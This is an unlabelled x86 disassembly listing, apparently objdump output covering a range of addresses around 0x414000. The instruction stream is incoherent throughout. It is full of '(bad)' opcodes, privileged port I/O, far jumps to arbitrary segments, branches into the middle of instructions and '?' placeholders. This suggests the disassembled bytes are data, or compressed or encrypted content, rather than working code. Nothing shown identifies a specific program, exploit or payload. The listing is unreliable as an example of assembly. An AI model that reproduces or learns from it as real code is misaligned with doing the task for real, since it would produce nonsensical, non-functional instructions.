  41412a:	push   0xd3a777b2
  41412f:	popf   
  414130:	inc    ebx
  414131:	mov    edi,DWORD PTR [ecx*2-0x1a75bccf]
  414138:	push   ebx
  414139:	fsub   QWORD PTR es:[edx]
  41413c:	jnp    0x414140
  41413e:	shl    BYTE PTR ds:0xc616a848,0xc7
  414145:	add    bl,BYTE PTR [edi-0x1f]
  414148:	jl     0x4140db
  41414a:	sub    eax,0xc2cf625b
  41414f:	mov    ah,0xe2
  414151:	xlat   BYTE PTR ds:[ebx]
  414152:	dec    ecx
  414153:	ficom  WORD PTR [esi+0x7c]
  414156:	lds    esp,FWORD PTR [ecx]
  414158:	ret    0x4b9b
  41415b:	fisttp DWORD PTR es:[ebx]
  41415e:	(bad)
  414161:	or     DWORD PTR [edi],eax
  414163:	sti    
  414164:	jbe    0x414131
  414166:	adc    BYTE PTR [eax],0xd0
  414169:	mov    cs,WORD PTR [eax+0x7cb2dff0]
  41416f:	popf   
  414170:	shl    dl,0x23
  414173:	lods   al,BYTE PTR ds:[esi]
  414174:	ffreep st(3)
  414176:	or     ch,BYTE PTR [edi+0xf]
  414179:	hlt    
  41417a:	loope  0x414141
  41417c:	dec    edx
  41417d:	mov    al,0x1
  41417f:	cmp    ebp,esi
  414181:	scas   eax,DWORD PTR es:[edi]
  414182:	xor    DWORD PTR ds:0x49e2f665,0xffffffe4
  414189:	test   eax,0xee5212dd
  41418e:	dec    edi
  41418f:	push   esi
  414190:	or     DWORD PTR [edi-0x3b],ebp
  414193:	jmp    0x599:0xa07384ca
  41419a:	xlat   BYTE PTR ds:[ebx]
  41419b:	pop    es
  41419c:	fdiv   st(0),st
  41419e:	shl    DWORD PTR [eax],1
  4141a0:	imul   ebx,DWORD PTR [esi-0x74],0x6d8ed945
  4141a7:	push   ecx
  4141a8:	(bad)  
  4141a9:	pop    ds
  4141aa:	push   cs
  4141ab:	nop
  4141ac:	loope  0x414224
  4141ae:	jae    0x41415d
  4141b0:	adc    al,0xc4
  4141b2:	dec    ebx
  4141b3:	aam    0x60
  4141b5:	sbb    al,0xbf
  4141b7:	(bad)  
  4141b8:	imul   esi,ebx,0x67
  4141bb:	pop    ds
  4141bc:	xor    DWORD PTR [ecx+0x31],edi
  4141bf:	std    
  4141c0:	ror    DWORD PTR [eax+eax*2],0x9a
  4141c4:	xchg   ebp,eax
  4141c5:	stos   BYTE PTR es:[edi],al
  4141c6:	sahf   
  4141c7:	xchg   esi,eax
  4141c8:	out    dx,al
  4141c9:	icebp  
  4141ca:	(bad)  
  4141cb:	out    0x11,eax
  4141cd:	inc    ebp
  4141ce:	shl    DWORD PTR [ebp+0x3a534d06],0x35
  4141d5:	imul   BYTE PTR es:[eax]
  4141d8:	dec    esp
  4141d9:	mov    ds,eax
  4141db:	icebp  
  4141dc:	out    0x88,eax
  4141de:	cmp    esp,ecx
  4141e0:	int    0xeb
  4141e2:	test   dl,bl
  4141e4:	dec    eax
  4141e5:	(bad)  
  4141e6:	out    0x3,al
  4141e8:	data16 jmp 0x414205
  4141eb:	fimul  WORD PTR [ebp+0xfb]
	...
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	rcl    BYTE PTR [esi+0x53],0x8
  414266:	fld    DWORD PTR [bx+si]
  414269:	add    BYTE PTR [eax],al
  41426b:	add    DWORD PTR [eax],eax
  41426d:	add    BYTE PTR [esi+0x1c],bl
  414270:	and    DWORD PTR [ebx],ebx
  414272:	and    dl,BYTE PTR [ecx]
  414274:	(bad)  
  414275:	mov    eax,ds:0x969126d8
  41427a:	iret   
  41427b:	add    esi,edi
  41427d:	push   ebp
  41427e:	enter  0x17fe,0xdf
  414282:	xchg   ebp,eax
  414283:	jbe    0x4142fb
  414285:	pop    esp
  414286:	or     DWORD PTR [esi-0x7fbf3f1a],edi
  41428c:	out    0xf2,al
  41428e:	jb     0x4142f7
  414290:	(bad)  
  414291:	btc    esi,edx
  414294:	dec    eax
  414295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414296:	daa    
  414297:	add    BYTE PTR [eax+0x545b1482],ch
  41429d:	(bad)  
  41429e:	mul    BYTE PTR [ebp+0x3a]
  4142a1:	pop    es
  4142a2:	jg     0x41426c
  4142a4:	push   ecx
  4142a5:	pop    ecx
  4142a6:	or     DWORD PTR [eax-0x45a5f04d],0x192c2160
  4142b0:	iret   
  4142b1:	push   ecx
  4142b2:	outs   dx,DWORD PTR ds:[esi]
  4142b3:	pushf  
  4142b4:	iret   
  4142b5:	jmp    0x3c78:0x4f75d8a6
  4142bc:	fs mov ebx,0x570ccb78
  4142c2:	inc    edi
  4142c3:	popf   
  4142c4:	aad    0x4a
  4142c6:	scas   al,BYTE PTR es:[edi]
  4142c7:	jmp    0x44b582b4
  4142cc:	(bad)  
  4142cd:	jbe    0x4142c9
  4142cf:	fidiv  WORD PTR [esi-0x5286aaf5]
  4142d5:	add    eax,0x4ada3454
  4142da:	imul   ecx,DWORD PTR [ebp+0x1],0x5e31ab69
  4142e1:	add    ebp,DWORD PTR [edx+edi*1+0x7d8a96ce]
  4142e8:	or     edi,DWORD PTR [eax-0x6fa5aaf6]
  4142ee:	sbb    esi,DWORD PTR [edi-0x3a]
  4142f1:	in     al,dx
  4142f2:	rcr    DWORD PTR [esi+0x2],cl
  4142f5:	mov    esi,0x3f9c9774
  4142fa:	jns    0x41429f
  4142fc:	leave  
  4142fd:	mov    ecx,0x48bade7c
  414302:	push   ecx
  414303:	sub    BYTE PTR [ebx],bl
  414305:	test   BYTE PTR fs:[bx+0x71],ah
  41430a:	test   eax,0x5113fa71
  41430f:	xchg   esi,eax
  414310:	nop
  414311:	fs mov dl,0x2
  414314:	adc    eax,0x748ef626
  414319:	rcl    BYTE PTR [edi],0x24
  41431c:	cmp    dl,BYTE PTR [eax+0x7b1abf56]
  414322:	in     al,dx
  414323:	mul    DWORD PTR [esi]
  414325:	dec    edx
  414326:	mov    es,WORD PTR [eax+0x7d327c90]
  41432c:	or     DWORD PTR [edx-0x8],0xffffffb5
  414330:	lahf   
  414331:	push   ebp
  414332:	add    eax,0x3b62ad9b
  414337:	mov    dl,0xa8
  414339:	ret    0xa49e
  41433c:	dec    ebx
  41433d:	pusha  
  41433e:	test   eax,0x40054230
  414343:	rcl    DWORD PTR [eax-0x6dfab547],1
  414349:	mov    DWORD PTR ds:0x362054c2,esp
  41434f:	in     al,dx
  414350:	shl    BYTE PTR [ebx+0x17076dc4],1
  414356:	ins    DWORD PTR es:[edi],dx
  414357:	icebp  
  414358:	btc    ebp,edi
  41435b:	xchg   esi,eax
  41435c:	lahf   
  41435d:	cmp    DWORD PTR [ebx],0xffffff8e
  414360:	xor    eax,0x30c23986
  414365:	jle    0x4142f2
  414367:	fbld   TBYTE PTR [ecx]
  414369:	cwde   
  41436a:	aad    0xc4
  41436c:	mov    cl,0x9e
	...
  4143d6:	add    DWORD PTR [ecx-0x2122293],eax
  4143dc:	mov    cl,0xdd
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	and    al,0x30
  4143e4:	pushf  
  4143e5:	call   0x100:0xda67
  4143ec:	add    BYTE PTR [eax],al
  4143ee:	cwde   
  4143ef:	hlt    
  4143f0:	jb     0x4143f1
  4143f2:	pop    ss
  4143f3:	(bad)  
  4143f4:	aam    0x4b
  4143f6:	adc    ch,BYTE PTR [eax+esi*8+0x4]
  4143fa:	mov    al,0xce
  4143fc:	std    
  4143fd:	(bad)  
  4143fe:	mov    ecx,DWORD PTR [eax-0x38531824]
  414404:	outs   dx,DWORD PTR ds:[esi]
  414405:	sbb    al,BYTE PTR [ecx]
  414407:	loope  0x4143f3
  414409:	fucomi st,st(0)
  41440b:	or     bh,BYTE PTR [esi-0x7aae4b36]
  414411:	rcr    DWORD PTR [edx],cl
  414413:	inc    edi
  414414:	xchg   edi,eax
  414415:	sbb    eax,0x9043220e
  41441a:	adc    eax,0xb955cf4c
  41441f:	sub    eax,0xbefc1fe
  414424:	or     DWORD PTR [ebp+0x6d9b6157],edx
  41442a:	repnz repnz lea ecx,[ebx+0x11]
  41442f:	mov    cl,bh
  414431:	cdq    
  414432:	js     0x414442
  414434:	jbe    0x414481
  414436:	cmp    BYTE PTR [edx],ch
  414438:	mov    dh,0x19
  41443a:	xchg   ebx,eax
  41443b:	sub    cl,BYTE PTR [esi-0x24cd8c14]
  414441:	mov    ch,0x39
  414443:	in     eax,dx
  414444:	cmp    DWORD PTR [ecx],edi
  414446:	jle    0x414489
  414448:	out    0xaa,eax
  41444a:	or     al,0xd
  41444c:	xlat   BYTE PTR ds:[ebx]
  41444d:	and    ebp,ebx
  41444f:	les    ebp,FWORD PTR [ebp-0x50d230a2]
  414455:	hlt    
  414456:	adc    al,0xfd
  414458:	loopne 0x41443a
  41445a:	xor    eax,0x2d346799
  41445f:	push   0x24dc85fb
  414464:	pushf  
  414465:	xchg   esp,eax
  414466:	or     BYTE PTR [edi-0x1d82cac0],al
  41446c:	pop    esp
  41446d:	sbb    bh,BYTE PTR [edi]
  41446f:	ja     0x414417
  414471:	(bad)  
  414472:	sub    WORD PTR [eax-0x65],si
  414476:	fstp   st(1)
  414478:	shl    esp,cl
  41447a:	pop    edx
  41447b:	pop    ecx
  41447c:	arpl   sp,di
  41447e:	xchg   esp,eax
  41447f:	mov    eax,0x68f5fc70
  414484:	and    al,0xb6
  414486:	or     bh,BYTE PTR [ebx]
  414488:	mov    WORD PTR [edx-0x4c],gs
  41448b:	pop    eax
  41448c:	sub    al,0xe1
  41448e:	jle    0x414493
  414490:	jb     0x4144a2
  414492:	push   0xffffffc8
  414494:	and    BYTE PTR [ebx-0xe],ch
  414497:	aas    
  414498:	cmp    eax,0x46e7e013
  41449d:	dec    ebp
  41449e:	test   eax,0x98a5c53
  4144a3:	jp     0x41444e
  4144a5:	ins    DWORD PTR es:[edi],dx
  4144a6:	fs xchg esi,eax
  4144a8:	shl    DWORD PTR gs:0x4ec0466f,0x4a
  4144b0:	dec    ebp
  4144b1:	mov    dl,0x49
  4144b3:	xor    DWORD PTR [edx-0x76],edx
  4144b6:	mov    ch,BYTE PTR [ecx+0x67b07801]
  4144bc:	leave  
  4144bd:	xchg   ebx,eax
  4144be:	inc    ebx
  4144bf:	std    
  4144c0:	and    ch,0x90
  4144c3:	outs   dx,DWORD PTR ds:[esi]
  4144c4:	pop    edx
  4144c5:	popa   
  4144c6:	or     ah,BYTE PTR ds:0x3348ea84
  4144cc:	mov    DWORD PTR [eax-0x54fce851],ecx
  4144d2:	cld    
  4144d3:	push   ebp
  4144d4:	in     al,dx
  4144d5:	fdivrp st(7),st
  4144d7:	add    BYTE PTR [edx-0x17863b2c],cl
  4144dd:	pop    eax
  4144de:	loopne 0x414462
  4144e0:	cmp    bh,BYTE PTR [ecx-0x44]
  4144e3:	sbb    eax,0xf0991618
  4144e8:	jno    0x414489
  4144ea:	jmp    0x4144ff
  4144ec:	enter  0xd4,0x0
	...
  414554:	add    BYTE PTR [eax],al
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x23]
  414563:	cs jb  0x414506
  414566:	fild   DWORD PTR [bx+si]
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    ah,ch
  41456f:	xchg   esi,eax
  414570:	jp     0x41458f
  414572:	sub    ah,BYTE PTR [ebp+0x30]
  414575:	pop    edx
  414576:	scas   eax,DWORD PTR es:[edi]
  414577:	cmp    DWORD PTR [ecx+0x59],ebp
  41457a:	stos   DWORD PTR es:[edi],eax
  41457b:	mov    ch,0x1c
  41457d:	pop    eax
  41457e:	jle    0x41453a
  414580:	xchg   edx,eax
  414581:	ffree  st(1)
  414583:	xor    BYTE PTR [edx+0x1f],0xe8
  414587:	popa   
  414588:	or     eax,0x1539900b
  41458d:	mov    bh,BYTE PTR [edx+ecx*1+0x1a437b3b]
  414594:	test   eax,0x9213f8ef
  414599:	and    DWORD PTR [esi+0x698821e6],edx
  41459f:	fiadd  DWORD PTR [edi+0x60a63d92]
  4145a5:	xchg   esp,eax
  4145a6:	lds    ebp,FWORD PTR [edx-0x6269903]
  4145ac:	sub    ebx,DWORD PTR [edi-0x346128f0]
  4145b2:	fstp   QWORD PTR [edx+0x62]
  4145b5:	cmp    bh,BYTE PTR [ebp+0x4caf3719]
  4145bb:	sbb    al,0xef
  4145bd:	ja     0x414574
  4145bf:	mov    al,ds:0x5fde0ade
  4145c4:	imul   ebp,DWORD PTR [ebx+0x7],0xa1b94992
  4145cb:	fs adc al,0x45
  4145ce:	xchg   ecx,eax
  4145cf:	inc    ebx
  4145d0:	push   esp
  4145d1:	in     al,dx
  4145d2:	call   DWORD PTR [esi]
  4145d4:	iret   
  4145d5:	shl    DWORD PTR [ecx-0x1c],1
  4145d8:	inc    ebx
  4145d9:	mov    ebx,0x61efa56d
  4145de:	and    DWORD PTR [edi-0x54],esi
  4145e1:	clc    
  4145e2:	gs inc ecx
  4145e4:	jl     0x414608
  4145e6:	jge    0x414636
  4145e8:	arpl   WORD PTR [edi-0x6fe17352],ax
  4145ee:	inc    ebp
  4145ef:	test   al,0xef
  4145f1:	adc    BYTE PTR [ecx+0x4d3462a7],ch
  4145f7:	ret    
  4145f8:	popa   
  4145f9:	add    BYTE PTR [esi-0x5f9a72cb],bl
  4145ff:	scas   eax,DWORD PTR es:[edi]
  414600:	(bad)  
  414601:	mov    ch,BYTE PTR [ecx]
  414603:	cmp    eax,0xb1530baf
  414608:	jbe    0x4145f7
  41460a:	add    BYTE PTR [ebx],bl
  41460c:	(bad)  
  41460e:	dec    ecx
  41460f:	inc    esp
  414610:	mov    ebp,fs
  414612:	mov    eax,DWORD PTR [edx]
  414614:	jo     0x414596
  414616:	cmp    eax,0x8902088a
  41461b:	data16 adc ch,cl
  41461e:	push   cs
  41461f:	push   edi
  414620:	cs jbe 0x414622
  414623:	xchg   esp,eax
  414624:	pop    edi
  414625:	inc    ebx
  414626:	call   0xabab:0xdf6a2fdb
  41462d:	adc    DWORD PTR [ecx-0x4],0xd59c43d1
  414634:	adc    ah,BYTE PTR [ebx+0x32]
  414637:	into   
  414638:	and    DWORD PTR [edx-0x38bb4db9],edi
  41463e:	pop    ecx
  41463f:	sub    ch,BYTE PTR [ebx]
  414641:	xor    al,0x12
  414643:	push   es
  414644:	mov    edi,0x3be68107
  414649:	into   
  41464a:	inc    edi
  41464b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41464c:	jle    0x4146b2
  41464e:	or     ecx,DWORD PTR [esi+0x499687a7]
  414654:	fadd   st,st(4)
  414656:	pop    ds
  414657:	(bad)  
  414658:	popa   
  414659:	push   esi
  41465a:	xchg   edi,eax
  41465b:	jmp    0x5f24:0xde23d885
  414662:	sub    eax,0xb8503231
  414667:	jl     0x4146c0
  414669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41466a:	mov    dh,0xdf
  41466c:	bound  edx,QWORD PTR [ebx+0x0]
	...
  4146d3:	add    BYTE PTR [eax],al
  4146d5:	add    BYTE PTR [edi+0x5e],bh
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x8
  4146e3:	sbb    eax,0xdc67cca7
  4146e8:	add    BYTE PTR [eax],al
  4146ea:	add    BYTE PTR [ecx],al
  4146ec:	add    BYTE PTR [eax],al
  4146ee:	fnsave [eax-0x2db59131]
  4146f4:	aaa    
  4146f5:	ficom  DWORD PTR [esi+0x29cdd92]
  4146fb:	out    0xf4,eax
  4146fd:	sar    BYTE PTR [eax],cl
  4146ff:	mov    ?,WORD PTR [esi+0x4c]
  414702:	leave  
  414703:	dec    edx
  414704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414705:	repnz pop esp
  414707:	call   0xfa62:0xb6a3fb86
  41470e:	cs loop 0x41472f
  414711:	pop    ecx
  414712:	cmp    DWORD PTR [ebx-0x43],ebx
  414715:	mov    al,ds:0x7957e09a
  41471a:	imul   ebp
  41471c:	sbb    edx,DWORD PTR [edx-0x6e767ab8]
  414722:	fsubr  st,st(2)
  414724:	cdq    
  414725:	cs enter 0xd146,0xcd
  41472a:	pusha  
  41472b:	popf   
  41472c:	je     0x414776
  41472e:	in     al,dx
  41472f:	cmp    BYTE PTR [ebx-0x1b],bl
  414732:	and    ebp,DWORD PTR [ecx-0x14]
  414735:	xchg   ebx,eax
  414736:	and    ah,bl
  414738:	mov    ecx,0x1998e552
  41473d:	push   ds
  41473e:	popa   
  41473f:	shr    DWORD PTR [edi],0x56
  414742:	or     al,0x8c
  414744:	adc    eax,0xd504809
  414749:	and    esp,DWORD PTR [esi]
  41474b:	retf   
  41474c:	xchg   edx,eax
  41474d:	adc    eax,0xb56f8e12
  414752:	shr    BYTE PTR [edx+eax*1-0x18],cl
  414756:	inc    edx
  414757:	dec    eax
  414758:	add    al,BYTE PTR [ebx]
  41475a:	adc    eax,0xaa70a99b
  41475f:	or     eax,0x55b519ec
  414764:	jmp    0xf4383e93
  414769:	mov    cl,0xed
  41476b:	add    dh,BYTE PTR [esi]
  41476d:	(bad)  
  41476f:	adc    al,0x33
  414771:	lods   al,BYTE PTR ds:[esi]
  414772:	pop    ds
  414773:	mov    al,ds:0x31a34836
  414778:	mov    BYTE PTR [eax+eiz*8-0x7b],ah
  41477c:	fstp   DWORD PTR [edi]
  41477e:	shl    DWORD PTR [eax+0x5e791ed8],1
  414784:	in     eax,0x1d
  414786:	or     DWORD PTR [edx],0x34a48dc
  41478c:	sbb    eax,0xcc7f2403
  414791:	add    DWORD PTR [ebx+0x67],ecx
  414794:	or     bl,BYTE PTR [ecx+edi*2+0x22a1508]
  41479b:	lds    edi,FWORD PTR [ecx]
  41479d:	adc    bl,BYTE PTR [ebx+0x7bcf4aaf]
  4147a3:	mov    dh,BYTE PTR [eax+0x30]
  4147a6:	pop    edx
  4147a7:	aas    
  4147a8:	sbb    eax,0x190fe69
  4147ad:	pop    ebp
  4147ae:	loop   0x4147ee
  4147b0:	das    
  4147b1:	test   eax,0x7baf3332
  4147b6:	int    0xb5
  4147b8:	push   ebx
  4147b9:	gs in  al,0x41
  4147bc:	pop    ecx
  4147bd:	jmp    0xf3c1:0xd07ee958
  4147c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147c5:	dec    edi
  4147c6:	(bad)  
  4147c7:	xor    eax,0x2d3446aa
  4147cc:	push   ss
  4147cd:	cwde   
  4147ce:	icebp  
  4147cf:	cmc    
  4147d0:	fstp   DWORD PTR [esi+0x46]
  4147d3:	je     0x4147ed
  4147d5:	nop
  4147d6:	int3   
  4147d7:	push   ecx
  4147d8:	mov    ecx,0x960f1c50
  4147dd:	out    0x7,eax
  4147df:	push   DWORD PTR [ecx-0x188067d]
  4147e5:	repnz inc ebx
  4147e7:	popf   
  4147e8:	cmp    BYTE PTR [edi],dl
  4147ea:	mov    ebp,?
  4147ec:	push   esp
  4147ed:	or     DWORD PTR [eax],eax
	...
  414853:	add    BYTE PTR [eax],al
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x7a888a35
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    ah,cl
  41486f:	mov    ecx,0xb2172926
  414874:	mov    ds:0xb1e37e19,al
  414879:	or     dh,BYTE PTR [esi+esi*1]
  41487c:	sbb    BYTE PTR fs:0x2ad20e56,ch
  414883:	stos   DWORD PTR es:[edi],eax
  414884:	pop    eax
  414885:	pop    es
  414886:	in     al,dx
  414887:	mov    ebx,0x3dc3f220
  41488c:	ja     0x414834
  41488e:	mov    eax,0x5f7e496a
  414893:	loopne 0x4148b9
  414895:	xchg   ebp,eax
  414896:	jo     0x4148ad
  414898:	pushf  
  414899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41489a:	(bad)  
  41489b:	loopne 0x414828
  41489d:	cmp    dl,BYTE PTR es:[edi]
  4148a0:	cwde   
  4148a1:	xor    DWORD PTR [edi],esi
  4148a3:	push   ebp
  4148a4:	mov    ecx,0xa1acbd0c
  4148a9:	xchg   esp,eax
  4148aa:	xchg   edi,eax
  4148ab:	or     bl,BYTE PTR [edi]
  4148ad:	loopne 0x4148f4
  4148af:	aam    0xdc
  4148b1:	mov    WORD PTR [edx-0x24b6b13b],fs
  4148b7:	outs   dx,BYTE PTR ds:[esi]
  4148b8:	popf   
  4148b9:	punpckhdq mm4,QWORD PTR [eax]
  4148bc:	adc    DWORD PTR [ecx-0x44c9b784],ecx
  4148c2:	push   0xffffffe4
  4148c4:	push   0xb4035244
  4148c9:	fnsave gs:[esi-0x5f]
  4148cd:	pop    ebp
  4148ce:	not    eax
  4148d0:	outs   dx,BYTE PTR cs:[esi]
  4148d2:	popf   
  4148d3:	xor    dh,BYTE PTR ds:0x31d6ee95
  4148d9:	lds    esi,FWORD PTR [edx-0x40]
  4148dc:	cdq    
  4148dd:	inc    esi
  4148de:	loopne 0x414881
  4148e0:	loope  0x414918
  4148e2:	cmp    BYTE PTR [ebp-0x4460df0e],dl
  4148e8:	add    ebx,esp
  4148ea:	mov    al,0x4f
  4148ec:	mov    BYTE PTR [edx-0x3c],0xe6
  4148f0:	xchg   BYTE PTR [edi+0x21],ch
  4148f3:	jle    0x414913
  4148f5:	jg     0x4148bc
  4148f7:	test   eax,0x957aacc3
  4148fc:	test   DWORD PTR [edx-0x3467187b],edi
  414902:	mov    esp,0x150e08d0
  414907:	fistp  QWORD PTR [ecx+0x23c99f63]
  41490d:	lock ins DWORD PTR es:[edi],dx
  41490f:	jmp    0x5962453d
  414914:	push   edx
  414915:	pushf  
  414916:	adc    BYTE PTR [esi+0x23],0xe6
  41491a:	jl     0x414970
  41491c:	cmc    
  41491d:	xchg   DWORD PTR [esp+edi*8+0x146d8bce],edi
  414924:	jge    0x4148fc
  414926:	cmp    DWORD PTR [edx],edi
  414928:	push   ebp
  414929:	jg     0x414902
  41492b:	fidivr DWORD PTR [eax-0x4f]
  41492e:	adc    edi,DWORD PTR [edi+ecx*1]
  414931:	inc    eax
  414932:	xchg   edi,eax
  414933:	js     0x414929
  414935:	dec    esp
  414936:	test   eax,0x95bb3261
  41493b:	test   DWORD PTR [edx+0x31788140],esp
  414941:	mov    ebp,ebx
  414943:	sbb    al,0x8a
  414945:	jl     0x414971
  414947:	into   
  414948:	nop
  414949:	xor    ah,bl
  41494b:	mov    ah,0x10
  41494d:	cmp    ch,BYTE PTR [eax-0x428c6f01]
  414953:	sbb    BYTE PTR [edi-0x43],dl
  414956:	imul   eax,DWORD PTR [ebp+0x43],0xffffffe4
  41495a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41495b:	retf   
  41495c:	mov    bl,BYTE PTR [edi]
  41495e:	add    esp,edi
  414960:	fnstsw WORD PTR [eax]
  414962:	jno    0x4149cf
  414964:	gs call 0xd879:0x1c65f381
  41496c:	cmp    al,0xa5
	...
  4149d6:	or     edi,DWORD PTR [esi-0x2e]
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	and    eax,0x6721e0ea
  4149e7:	fiadd  WORD PTR [eax]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    BYTE PTR [ebx-0x40],bh
  4149f0:	scas   al,BYTE PTR es:[edi]
  4149f1:	pop    esp
  4149f2:	xchg   ebp,eax
  4149f3:	pusha  
  4149f4:	in     eax,dx
  4149f5:	jecxz  0x4149d1
  4149f7:	xchg   edi,eax
  4149f8:	xchg   ebx,eax
  4149f9:	mov    al,ds:0x12e0bca7
  4149fe:	cmp    BYTE PTR [edx],al
  414a00:	icebp  
  414a01:	push   eax
  414a02:	xchg   edi,eax
  414a03:	iret   
  414a04:	cli    
  414a05:	xchg   BYTE PTR [esi],al
  414a07:	shl    DWORD PTR [ebp+0x2266eb13],1
  414a0d:	ds xchg ebp,eax
  414a0f:	mov    al,ds:0x4ea447f9
  414a14:	mov    bl,0x81
  414a16:	bound  ebx,QWORD PTR [eax]
  414a18:	imul   ecx,DWORD PTR [edx+0x6c],0xffffffcd
  414a1c:	(bad)  
  414a1d:	xchg   edx,eax
  414a1e:	xor    dl,BYTE PTR [edx]
  414a20:	mov    ch,0x8c
  414a22:	je     0x414a6c
  414a24:	jge    0x414a3b
  414a26:	or     al,BYTE PTR [edx-0x70]
  414a29:	or     eax,edx
  414a2b:	add    al,0xe
  414a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a2e:	out    dx,eax
  414a2f:	call   0x8c4a:0xeec4e5df
  414a36:	jecxz  0x414a6a
  414a38:	loopne 0x4149c0
  414a3a:	cs in  al,0x6d
  414a3d:	adc    eax,0xc9e4de88
  414a42:	fs push ss
  414a44:	sti    
  414a45:	cmp    DWORD PTR [ebx-0x79],esp
  414a48:	jmp    0x5b95fdbf
  414a4d:	rcl    ebx,cl
  414a4f:	or     dh,BYTE PTR [ebp+eax*2+0x7b9adbc4]
  414a56:	xchg   edi,eax
  414a57:	xor    DWORD PTR ds:0xa3f45e94,esi
  414a5d:	(bad)  
  414a5e:	nop
  414a5f:	mov    ebp,edx
  414a61:	pop    edx
  414a62:	test   al,0xd3
  414a64:	jo     0x414a7c
  414a66:	dec    ebp
  414a67:	aaa    
  414a68:	add    al,0x53
  414a6a:	dec    ebp
  414a6b:	test   edx,0xd17994b0
  414a71:	xor    edx,edx
  414a73:	xchg   edi,eax
  414a74:	aad    0x4a
  414a76:	pop    ebx
  414a77:	adc    eax,0x6fa282cc
  414a7c:	inc    edi
  414a7d:	pop    esi
  414a7e:	mov    al,ds:0xf1004922
  414a83:	mov    esi,0x7d33c3fa
  414a88:	lahf   
  414a89:	lea    ecx,[ebx-0x18]
  414a8c:	aaa    
  414a8d:	shr    DWORD PTR [ebp-0x25],cl
  414a90:	pushf  
  414a91:	add    WORD PTR [esi-0x46],dx
  414a95:	xor    ebx,DWORD PTR ds:[eax+0x77a1e586]
  414a9c:	push   esp
  414a9d:	xor    BYTE PTR [ebp-0x3898b543],0xd7
  414aa4:	jmp    0x784d:0x29ffdda3
  414aab:	jne    0x414a51
  414aad:	mov    bl,0xe5
  414aaf:	jecxz  0x414b1f
  414ab1:	jle    0x414ac9
  414ab3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  414ab5:	fcom   QWORD PTR [edx+0x1]
  414ab8:	mov    edx,0xbcac5261
  414abd:	ror    BYTE PTR [edi],cl
  414abf:	sbb    eax,0xded2acf3
  414ac4:	mov    al,ds:0x67b5ddf9
  414ac9:	mov    ?,WORD PTR [ebx+esi*2-0x69]
  414acd:	in     eax,0x7b
  414acf:	imul   esp,DWORD PTR [esi-0x75],0x24f99e29
  414ad6:	int3   
  414ad7:	mov    ds:0xf18c558f,eax
  414adc:	jp     0x414ae8
  414ade:	adc    eax,0xcebc8552
  414ae3:	mov    ebp,0xd137638c
  414ae8:	pop    ebx
  414ae9:	jge    0x414b28
  414aeb:	ror    BYTE PTR [edi+0x26],cl
	...
  414b56:	lahf   
  414b57:	fnstcw WORD PTR [esi]
  414b59:	ss jle 0x414b53
  414b5c:	lahf   
  414b5d:	stc    
  414b5e:	bound  esp,QWORD PTR [ebx-0x6fbf9c27]
  414b64:	les    eax,FWORD PTR [eax+0xdf67]
  414b6a:	add    BYTE PTR [ecx],al
  414b6c:	add    BYTE PTR [eax],al
  414b6e:	fiadd  DWORD PTR [edx+0x499a865]
  414b74:	js     0x414bc3
  414b76:	stos   BYTE PTR es:[edi],al
  414b77:	pop    ebx
  414b78:	push   ss
  414b79:	jno    0x414b5c
  414b7b:	dec    edi
  414b7c:	leave  
  414b7d:	pop    esi
  414b7e:	add    esp,DWORD PTR [edi]
  414b80:	outs   dx,DWORD PTR ds:[esi]
  414b81:	icebp  
  414b82:	or     al,0x83
  414b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b85:	aas    
  414b86:	cmp    eax,0xc159cde6
  414b8b:	out    dx,eax
  414b8c:	jge    0x414bab
  414b8e:	xor    cl,BYTE PTR [esi-0xdecda6b]
  414b94:	xchg   ebx,eax
  414b95:	cli    
  414b96:	push   esi
  414b97:	inc    esp
  414b98:	and    al,0x3a
  414b9a:	jl     0x414b2f
  414b9c:	mov    BYTE PTR [edx],dh
  414b9e:	popf   
  414b9f:	push   ebp
  414ba0:	(bad)  
  414ba1:	add    al,0x62
  414ba3:	mov    ebp,0xc8e901fa
  414ba8:	aad    0xc4
  414baa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bab:	stos   DWORD PTR es:[edi],eax
  414bac:	jno    0x414bc8
  414bae:	or     al,0xc6
  414bb0:	(bad)  
  414bb2:	push   ebp
  414bb3:	ins    BYTE PTR es:[edi],dx
  414bb4:	mov    bh,0x73
  414bb7:	(bad)  
  414bb8:	repz (bad) 
  414bba:	out    dx,eax
  414bbb:	cld    
  414bbc:	(bad)  
  414bbe:	mov    dh,0x84
  414bc0:	fistp  WORD PTR [edx]
